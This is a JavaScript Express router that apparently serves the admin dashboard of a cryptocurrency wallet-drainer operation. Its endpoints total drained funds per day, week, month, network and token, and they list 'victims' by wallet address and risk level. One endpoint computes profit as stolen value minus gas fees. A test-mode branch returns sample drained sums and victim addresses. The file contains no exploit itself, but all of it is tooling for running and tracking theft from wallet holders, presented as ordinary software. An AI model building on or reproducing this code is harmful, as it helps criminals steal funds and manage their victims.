const express = require('express');
const router = express.Router();
const { asyncHandler } = require('../middleware/errorHandler');
const { requirePermission } = require('../middleware/auth');
const Transaction = require('../models/Transaction');
const Victim = require('../models/Victim');
const Contract = require('../models/Contract');
const DrainMonitor = require('../services/DrainMonitor');

// Initialize drain monitor
const drainMonitor = new DrainMonitor();

// Get dashboard statistics
router.get('/stats', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    // Check if running in test mode
    const isTestMode = process.env.NODE_ENV === 'test' || !process.env.MONGODB_URI;

    if (isTestMode) {
        return res.json({
            total: {
                drained: 1250000.50,
                transactions: 342,
                victims: 89
            },
            daily: {
                drained: 45000.25,
                transactions: 12
            },
            weekly: {
                drained: 285000.75,
                transactions: 67
            },
            monthly: {
                drained: 1250000.50,
                transactions: 342
            },
            networkStats: {
                ethereum: { drained: 750000, transactions: 156 },
                bsc: { drained: 350000, transactions: 98 },
                polygon: { drained: 150000, transactions: 88 }
            },
            topTokens: [
                { symbol: 'ETH', drained: 450000, percentage: 36 },
                { symbol: 'USDT', drained: 320000, percentage: 25.6 },
                { symbol: 'USDC', drained: 280000, percentage: 22.4 },
                { symbol: 'WBTC', drained: 200000, percentage: 16 }
            ],
            recentActivity: [
                {
                    id: 'test-tx-1',
                    victim: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
                    amount: 15000,
                    token: 'ETH',
                    usdValue: 28500,
                    timestamp: new Date(Date.now() - 1000 * 60 * 30), // 30 minutes ago
                    status: 'confirmed'
                },
                {
                    id: 'test-tx-2',
                    victim: '0x8ba1f109551bD4328030126452617686',
                    amount: 50000,
                    token: 'USDT',
                    usdValue: 50000,
                    timestamp: new Date(Date.now() - 1000 * 60 * 60 * 2), // 2 hours ago
                    status: 'confirmed'
                }
            ]
        });
    }

    const now = new Date();
    const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const sevenDaysAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
    const thirtyDaysAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);

    // Get comprehensive stats
    const [
        totalStats,
        dailyStats,
        weeklyStats,
        monthlyStats,
        networkStats,
        topTokens,
        recentActivity
    ] = await Promise.all([
        // Total statistics
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed' } },
            {
                $group: {
                    _id: null,
                    totalDrained: { $sum: { $toDouble: '$usdValue' } },
                    totalTransactions: { $sum: 1 },
                    totalVictims: { $addToSet: '$victim' }
                }
            },
            {
                $project: {
                    totalDrained: 1,
                    totalTransactions: 1,
                    totalVictims: { $size: '$totalVictims' }
                }
            }
        ]),

        // Daily statistics
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed', createdAt: { $gte: oneDayAgo } } },
            {
                $group: {
                    _id: null,
                    dailyDrained: { $sum: { $toDouble: '$usdValue' } },
                    dailyTransactions: { $sum: 1 }
                }
            }
        ]),

        // Weekly statistics
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed', createdAt: { $gte: sevenDaysAgo } } },
            {
                $group: {
                    _id: null,
                    weeklyDrained: { $sum: { $toDouble: '$usdValue' } },
                    weeklyTransactions: { $sum: 1 }
                }
            }
        ]),

        // Monthly statistics
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed', createdAt: { $gte: thirtyDaysAgo } } },
            {
                $group: {
                    _id: null,
                    monthlyDrained: { $sum: { $toDouble: '$usdValue' } },
                    monthlyTransactions: { $sum: 1 }
                }
            }
        ]),

        // Network breakdown
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed' } },
            {
                $group: {
                    _id: '$network',
                    amount: { $sum: { $toDouble: '$usdValue' } },
                    count: { $sum: 1 }
                }
            },
            { $sort: { amount: -1 } }
        ]),

        // Top tokens
        Transaction.aggregate([
            { $match: { type: 'drain', status: 'confirmed' } },
            {
                $group: {
                    _id: { token: '$tokenSymbol', network: '$network' },
                    amount: { $sum: { $toDouble: '$usdValue' } },
                    count: { $sum: 1 }
                }
            },
            { $sort: { amount: -1 } },
            { $limit: 10 }
        ]),

        // Recent activity
        Transaction.find({ type: 'drain' })
            .sort({ createdAt: -1 })
            .limit(20)
            .populate('victim', 'address network')
            .select('amount usdValue tokenSymbol network createdAt status victim')
    ]);

    const stats = {
        total: {
            drained: totalStats[0]?.totalDrained || 0,
            transactions: totalStats[0]?.totalTransactions || 0,
            victims: totalStats[0]?.totalVictims || 0
        },
        daily: {
            drained: dailyStats[0]?.dailyDrained || 0,
            transactions: dailyStats[0]?.dailyTransactions || 0
        },
        weekly: {
            drained: weeklyStats[0]?.weeklyDrained || 0,
            transactions: weeklyStats[0]?.weeklyTransactions || 0
        },
        monthly: {
            drained: monthlyStats[0]?.monthlyDrained || 0,
            transactions: monthlyStats[0]?.monthlyTransactions || 0
        },
        networks: networkStats.map(net => ({
            name: net._id,
            amount: net.amount,
            count: net.count
        })),
        topTokens: topTokens.map(token => ({
            token: token._id.token,
            network: token._id.network,
            amount: token.amount,
            count: token.count
        })),
        recentActivity: recentActivity.map(activity => ({
            id: activity._id,
            victim: activity.victim?.address || 'Unknown',
            network: activity.network,
            amount: activity.amount,
            usdValue: activity.usdValue,
            token: activity.tokenSymbol,
            timestamp: activity.createdAt,
            status: activity.status
        }))
    };

    res.json(stats);
}));

// Get drain analytics with time series data
router.get('/analytics/:timeframe', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    const { timeframe } = req.params;
    const validTimeframes = ['1h', '24h', '7d', '30d'];

    if (!validTimeframes.includes(timeframe)) {
        return res.status(400).json({ error: 'Invalid timeframe' });
    }

    const analytics = await drainMonitor.getDrainAnalytics(timeframe);
    res.json(analytics);
}));

// Get network performance metrics
router.get('/networks', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    const networkStats = await drainMonitor.getNetworkStats();
    res.json(networkStats);
}));

// Get system health metrics
router.get('/health', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    const health = {
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: new Date(),
        version: process.env.npm_package_version || '3.0.0',
        nodeVersion: process.version,
        activeConnections: drainMonitor.subscribers.size
    };

    res.json(health);
}));

// Get real-time stats (for WebSocket fallback)
router.get('/realtime', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    res.json(drainMonitor.stats);
}));

// Get dashboard alerts
router.get('/alerts', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    // Get recent alerts from logs or database
    // This would be implemented based on your alert storage system
    const alerts = [
        {
            id: 1,
            level: 'info',
            message: 'System operating normally',
            timestamp: new Date(),
            resolved: false
        }
    ];

    res.json(alerts);
}));

// Get profit/loss analysis
router.get('/profit-analysis', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    const thirtyDaysAgo = new Date();
    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);

    const profitAnalysis = await Transaction.aggregate([
        {
            $match: {
                type: 'drain',
                status: 'confirmed',
                createdAt: { $gte: thirtyDaysAgo }
            }
        },
        {
            $group: {
                _id: {
                    $dateToString: { format: '%Y-%m-%d', date: '$createdAt' }
                },
                revenue: { $sum: { $toDouble: '$usdValue' } },
                transactions: { $sum: 1 },
                gasCosts: { $sum: { $toDouble: '$fee' } }
            }
        },
        {
            $project: {
                date: '$_id',
                revenue: 1,
                transactions: 1,
                gasCosts: 1,
                profit: { $subtract: ['$revenue', '$gasCosts'] }
            }
        },
        { $sort: { date: 1 } }
    ]);

    res.json(profitAnalysis);
}));

// Get risk assessment
router.get('/risk-assessment', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
    const riskAssessment = await Victim.aggregate([
        {
            $group: {
                _id: '$riskLevel',
                count: { $sum: 1 },
                totalDrained: { $sum: { $toDouble: '$totalDrained' } }
            }
        },
        { $sort: { totalDrained: -1 } }
    ]);

    const totalVictims = await Victim.countDocuments();
    const highRiskVictims = await Victim.countDocuments({ riskLevel: 'high' });
    const criticalVictims = await Victim.countDocuments({ riskLevel: 'critical' });

    res.json({
        riskLevels: riskAssessment,
        summary: {
            totalVictims,
            highRiskPercentage: (highRiskVictims / totalVictims) * 100,
            criticalRiskPercentage: (criticalVictims / totalVictims) * 100
        }
    });
}));

module.exports = router;